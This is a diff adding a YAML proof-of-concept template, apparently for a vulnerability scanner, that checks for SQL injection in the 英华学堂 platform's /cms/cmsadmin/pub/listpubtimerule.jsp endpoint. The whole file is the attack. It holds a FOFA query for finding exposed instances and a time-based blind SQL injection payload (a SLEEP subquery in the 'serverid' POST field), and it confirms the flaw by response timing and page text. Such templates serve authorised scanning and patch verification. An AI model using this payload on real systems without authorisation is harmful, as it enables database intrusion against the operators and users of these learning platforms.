@@ -1,0 +1,21 @@
+id: poc-yaml-yinghuaonline-listpubtimerule-jsp-sqli
+info:
+  name: 英华学堂 listpubtimerule.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 英华学堂
+  fofa: body="英华在线"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: POST
+  path: /cms/cmsadmin/pub/listpubtimerule.jsp
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: serverid=' AND (SELECT 8490 FROM (SELECT(SLEEP({{.t1}})))iIeJ) AND 'VXvO'='VXvO
+  expression: status_code == 200 && contains(body,"listpubtimerule") && contains(body,"定时发布规则")
+    && contains(body,"规则名称") && duration > t2 && duration < t3
+transport: http
